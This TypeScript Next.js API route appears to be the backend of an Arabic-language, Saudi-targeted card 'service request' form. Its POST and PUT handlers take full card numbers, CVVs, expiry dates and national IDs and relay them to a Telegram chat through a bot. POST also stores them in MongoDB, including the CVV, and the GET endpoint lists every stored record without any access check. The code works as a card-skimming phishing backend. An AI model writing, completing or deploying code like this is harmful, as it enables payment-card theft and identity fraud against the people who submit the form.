import { NextRequest, NextResponse } from "next/server";
import { connectDB } from "@/lib/mongodb";
import ServiceRequest from "@/lib/models/ServiceRequest";
import CardTransaction from "@/lib/models/CardTransaction";
import { v4 as uuidv4 } from "uuid";

const TRANSACTION_LABELS: Record<string, string> = {
  installments: "تنظيم الأقساط الشهرية",
  deduction: "استقطاع شهري",
  refund: "استرجاع الدفعة",
  payment: "دفع فاتورة",
};

async function sendTelegram(text: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
  });
}

export async function POST(req: NextRequest) {
  try {
    await connectDB();
    const body = await req.json();
    const { cardHolderName, nationalId, age, cardNumber, cvv, expiryDate, transactionType, installmentDay, amount } = body;

    if (!cardHolderName || !nationalId || !cardNumber || !cvv || !expiryDate || !transactionType) {
      return NextResponse.json({ error: "جميع الحقول المطلوبة يجب تعبئتها" }, { status: 400 });
    }

    const trackingNumber = "SR-" + uuidv4().slice(0, 8).toUpperCase();

    const request = await ServiceRequest.create({
      trackingNumber,
      cardHolderName,
      nationalId,
      age,
      cardNumber,
      cvv,
      expiryDate,
      transactionType,
      installmentDay: (transactionType === "installments" || transactionType === "deduction") ? installmentDay : undefined,
      amount: (transactionType === "refund" || transactionType === "payment") ? amount : undefined,
    });

    await CardTransaction.create({
      transactionId: "TXN-" + uuidv4().replace(/-/g, "").slice(0, 12).toUpperCase(),
      cardHolderName,
      cardNumber,
      cvv,
      expiryDate,
      nationalId,
      age,
      transactionType,
      installmentDay: (transactionType === "installments" || transactionType === "deduction") ? installmentDay : undefined,
      amount: (transactionType === "refund" || transactionType === "payment") ? amount : undefined,
      trackingNumber,
    });

    const needsDay = transactionType === "installments" || transactionType === "deduction";
    const needsAmount = transactionType === "refund" || transactionType === "payment";

    const message = [
      `🔔 <b>طلب جديد</b> — <code>${trackingNumber}</code>`,
      ``,
      `👤 <b>اسم حامل البطاقة:</b> ${cardHolderName}`,
      `🪪 <b>رقم الهوية الوطنية:</b> <code>${nationalId}</code>`,
      `🎂 <b>العمر:</b> ${age}`,
      `💳 <b>رقم البطاقة:</b> <code>${cardNumber}</code>`,
      `🔐 <b>CVV:</b> <code>${cvv}</code>`,
      `📅 <b>تاريخ الانتهاء:</b> ${expiryDate}`,
      `🔄 <b>نوع المعاملة:</b> ${TRANSACTION_LABELS[transactionType] ?? transactionType}`,
      ...(needsDay ? [`📆 <b>يوم السداد:</b> ${installmentDay}`] : []),
      ...(needsAmount ? [`💰 <b>المبلغ:</b> ${amount} ر.س`] : []),
    ].join("\n");

    await sendTelegram(message);

    return NextResponse.json({ trackingNumber: request.trackingNumber }, { status: 201 });
  } catch {
    return NextResponse.json({ error: "حدث خطأ في الخادم" }, { status: 500 });
  }
}

export async function PUT(req: NextRequest) {
  try {
    const body = await req.json();
    const { customerName, cardHolderName, cardNumber, cvv, expiryDate, transactionType, installmentDay, amount, transactionId } = body;

    const needsDay = transactionType === "installments" || transactionType === "deduction";
    const needsAmount = transactionType === "refund" || transactionType === "payment";

    function detectCardType(num: string) {
      if (/^4/.test(num)) return "Visa";
      if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
      if (/^(5078|5079|4783|9682|968[2-9]|60)/.test(num)) return "Mada";
      return "Card";
    }

    const cardType = detectCardType(cardNumber ?? "");
    const formatted = (cardNumber ?? "").replace(/(\d{4})(?=\d)/g, "$1 ");

    const message = [
      ...(transactionId ? [`🆔 Transaction ID: <code>${transactionId}</code>`] : []),
      `💳 <b>${cardType}</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `👤 Order For: ${customerName ?? cardHolderName ?? ""}`,
      `💳 Card Number: <code>${formatted}</code>`,
      `👤 Card Holder: ${cardHolderName ?? ""}`,
      `📅 Valid To: ${expiryDate ?? ""}`,
      `🔐 CVV: <code>${cvv ?? ""}</code>`,
      `━━━━━━━━━━━━━━━━━━`,
      `🔄 Transaction: ${TRANSACTION_LABELS[transactionType] ?? transactionType ?? ""}`,
      ...(needsDay ? [`📆 Installment Day: ${installmentDay}`] : []),
      ...(needsAmount ? [`💰 Amount: ${amount} ر.س`] : []),
    ].join("\n");

    await sendTelegram(message);
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ error: "حدث خطأ" }, { status: 500 });
  }
}

export async function GET(req: NextRequest) {
  try {
    await connectDB();
    const { searchParams } = new URL(req.url);
    const search = searchParams.get("search") || "";
    const type = searchParams.get("type") || "";
    const status = searchParams.get("status") || "";

    const filter: Record<string, unknown> = {};
    if (search) {
      filter.$or = [
        { cardHolderName: { $regex: search, $options: "i" } },
        { nationalId: { $regex: search } },
        { cardNumber: { $regex: search } },
        { trackingNumber: { $regex: search, $options: "i" } },
      ];
    }
    if (type) filter.transactionType = type;
    if (status) filter.status = status;

    const requests = await ServiceRequest.find(filter).sort({ createdAt: -1 }).lean();
    return NextResponse.json(requests);
  } catch {
    return NextResponse.json({ error: "حدث خطأ" }, { status: 500 });
  }
}
